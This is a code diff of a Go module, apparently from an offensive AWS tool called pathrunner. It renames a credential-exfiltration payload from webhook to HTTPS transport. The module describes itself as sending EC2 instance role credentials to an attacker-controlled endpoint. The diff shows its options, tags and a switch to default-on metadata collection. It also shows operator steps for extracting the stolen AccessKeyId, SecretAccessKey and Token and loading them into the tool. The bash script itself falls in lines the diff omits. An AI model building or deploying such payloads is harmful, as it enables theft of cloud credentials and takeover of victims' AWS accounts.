@@ -8,34 +8,34 @@ import (
 	"strings"
 )
 
-type ExfilWebhookPayload struct{}
+type ExfilHTTPSPayload struct{}
 
-func NewExfilWebhookPayload() *ExfilWebhookPayload {
-	return &ExfilWebhookPayload{}
+func NewExfilHTTPSPayload() *ExfilHTTPSPayload {
+	return &ExfilHTTPSPayload{}
 }
 
 func init() {
-	payloads.Register(NewExfilWebhookPayload())
+	payloads.Register(NewExfilHTTPSPayload())
 }
 
-func (p *ExfilWebhookPayload) GetName() string {
-	return "exfil/webhook"
+func (p *ExfilHTTPSPayload) GetName() string {
+	return "exfil/https"
 }
 
-func (p *ExfilWebhookPayload) GetDescription() string {
-	return "Exfiltrate EC2 instance role credentials to attacker-controlled webhook"
+func (p *ExfilHTTPSPayload) GetDescription() string {
+	return "Exfiltrate EC2 instance role credentials to attacker-controlled HTTPS endpoint"
 }
 
-func (p *ExfilWebhookPayload) GetTags() []string {
+func (p *ExfilHTTPSPayload) GetTags() []string {
 	return []string{
 		payloads.TagServiceEC2,
 		payloads.TagLanguageBash,
 		payloads.TagTechniqueExfil,
-		payloads.TagTransportWebhook,
+		payloads.TagTransportHTTPS,
 	}
 }
 
-func (p *ExfilWebhookPayload) GetOptions() []modules.Option {
+func (p *ExfilHTTPSPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
 			Name:        "WEBHOOK_URL",
@@ -57,9 +57,9 @@ func (p *ExfilWebhookPayload) GetOptions() []modules.Option {
 	}
 }
 
-func (p *ExfilWebhookPayload) GenerateCode(options map[string]string) (string, error) {
+func (p *ExfilHTTPSPayload) GenerateCode(options map[string]string) (string, error) {
 	webhookURL := options["WEBHOOK_URL"]
-	includeMetadata := options["INCLUDE_METADATA"] == "true"
+	includeMetadata := options["INCLUDE_METADATA"] != "false" // default true
 	userAgent := options["USER_AGENT"]
 	if userAgent == "" {
 		userAgent = "AWS-EC2-Instance"
@@ -162,7 +162,7 @@ echo "Exfiltration complete"
 	return userDataScript, nil
 }
 
-func (p *ExfilWebhookPayload) ProcessResult(result string) (string, error) {
+func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
 	var instanceData map[string]interface{}
 	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
 		return result, nil
@@ -199,7 +199,7 @@ func (p *ExfilWebhookPayload) ProcessResult(result string) (string, error) {
 	output.WriteString("1. Check your webhook endpoint for the credential payload\n")
 	output.WriteString("2. Extract AccessKeyId, SecretAccessKey, and Token\n")
 	output.WriteString("3. Configure AWS CLI or add to pathrunner with:\n")
-	output.WriteString("   identity add --keys <ACCESS_KEY> <SECRET_KEY> <TOKEN>\n\n")
+	output.WriteString("   identity add --access <ACCESS_KEY> --secret <SECRET_KEY> --token <TOKEN>\n\n")
 
 	output.WriteString("To check exfiltration logs:\n")
 	output.WriteString("aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")
@@ -207,9 +207,9 @@ func (p *ExfilWebhookPayload) ProcessResult(result string) (string, error) {
 	return output.String(), nil
 }
 
-func (p *ExfilWebhookPayload) Validate(options map[string]string) error {
+func (p *ExfilHTTPSPayload) Validate(options map[string]string) error {
 	if options["WEBHOOK_URL"] == "" {
-		return fmt.Errorf("WEBHOOK_URL is required for exfil/webhook payload")
+		return fmt.Errorf("WEBHOOK_URL is required for exfil/https payload")
 	}
 
 	// Basic URL validation
